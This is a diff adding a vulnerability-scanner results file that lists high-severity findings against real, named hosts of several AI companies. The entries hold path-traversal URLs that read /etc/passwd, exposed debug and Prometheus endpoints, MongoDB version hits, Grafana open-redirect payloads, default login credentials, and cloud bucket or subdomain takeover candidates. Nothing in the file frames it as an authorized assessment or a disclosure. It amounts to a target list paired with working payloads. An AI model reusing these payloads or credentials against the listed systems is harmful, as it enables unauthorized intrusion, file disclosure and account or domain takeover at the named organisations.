@@ -1,0 +1,45 @@
+[CVE-2010-4231] [http] [high] https://asr.sarvam.ai/../../../../../../../../../../../../../etc/passwd
+[CVE-2018-10956] [http] [high] https://asr.sarvam.ai/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
+[CVE-2018-19326] [http] [high] https://asr.sarvam.ai/../../../../../../../../../../../../etc/passwd
+[CVE-2018-7490] [http] [high] https://asr.sarvam.ai/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+[CVE-2019-11248] [http] [high] https://digitalocean-inference-us-atl1-prometheus.tunnel.fireworks.ai/debug/pprof/
+[CVE-2019-11248] [http] [high] https://infra-platform.mc-dev.baseten.co/debug/pprof/
+[CVE-2019-18922] [http] [high] https://asr.sarvam.ai/../../../../../../etc/passwd
+[CVE-2019-7315] [http] [high] https://asr.sarvam.ai/../../../../../etc/passwd
+[CVE-2020-12447] [http] [high] https://asr.sarvam.ai/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+[CVE-2021-40978] [http] [high] https://asr.sarvam.ai/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[CVE-2022-38794] [http] [high] https://asr.sarvam.ai/../../../../../../../../etc/passwd
+[CVE-2024-4956] [http] [high] https://asr.sarvam.ai/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+[CVE-2025-14847:version] [tcp] [high] annapurna.koyal.ai:27017 ["7.0.23"]
+[CVE-2025-14847:version] [tcp] [high] beta.koyal.ai:27017 ["7.0.23"]
+[CVE-2025-14847:version] [tcp] [high] charcha.koyal.ai:27017 ["8.0.4"]
+[CVE-2025-14847:version] [tcp] [high] demo.koyal.ai:27017 ["8.0.4"]
+[CVE-2025-14847:version] [tcp] [high] dev.koyal.ai:27017 ["8.0.4"]
+[CVE-2025-14847:version] [tcp] [high] garryslist.koyal.ai:27017 ["7.0.23"]
+[CVE-2025-14847:version] [tcp] [high] koyal.ai:27017 ["7.0.23"]
+[CVE-2025-14847:version] [tcp] [high] music.koyal.ai:27017 ["8.0.4"]
+[CVE-2025-14847:version] [tcp] [high] qa.koyal.ai:27017 ["8.0.4"]
+[CVE-2025-14847:version] [tcp] [high] trueshort.koyal.ai:27017 ["7.0.23"]
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana.sip-web.vapi.ai/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana.staging-sip-web.vapi.ai/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana.staging-sip-web1.vapi.ai/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana.staging-sip-web2.vapi.ai/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana.web-mini.vapi.ai/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-55184] [http] [high] https://chat-pathfinder.sarvam.ai
+[CVE-2025-55184] [http] [high] https://dev.fireworks.ai/account/home
+[CVE-2025-55184] [http] [high] https://exa.ai/search/xwrapped
+[CVE-2025-55184] [http] [high] https://fireworks.ai
+[CVE-2025-55184] [http] [high] https://fireworks.ai/
+[apache-casbin-mcp-gateway-default-login] [http] [high] https://creators.n8n.io/login [password="password123",username="alice"]
+[apache-casbin-mcp-gateway-default-login] [http] [high] https://stage-creators.n8n.io/login [password="password123",username="alice"]
+[aws-bucket-takeover] [http] [high] http://cdn.arya.sarvam.ai ["cdn.arya.sarvam.ai"]
+[aws-bucket-takeover] [http] [high] https://media-assets.gradial.com ["media-assets.gradial.com"]
+[bullwark-momentum-lfi] [http] [high] https://asr.sarvam.ai/../../../../../../../../../../../../../etc/passwd
+[framer-takeover] [http] [high] https://teaser.odyssey.world ["sites.framer.app"]
+[generic-linux-lfi] [http] [high] https://asr.sarvam.ai/./../../../../../../../../../../etc/passwd [paths="/./../../../../../../../../../../etc/passwd"]
+[generic-linux-lfi] [http] [high] https://staging-webrtc.vapi.ai/etc/passwd [paths="/etc/passwd"]
+[gsoap-lfi] [http] [high] https://asr.sarvam.ai/../../../../../../../../../etc/passwd
+[ibm-infoprint-lfi] [http] [high] https://asr.sarvam.ai/./../../../../../../../../../../etc/passwd
+[nginx-merge-slashes-path-traversal] [http] [high] https://asr.sarvam.ai///////../../../etc/passwd
+[prometheus-unauth] [http] [high] https://digitalocean-inference-us-atl1-prometheus.tunnel.fireworks.ai/api/v1/status/config
+[ups-network-lfi] [http] [high] https://asr.sarvam.ai/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
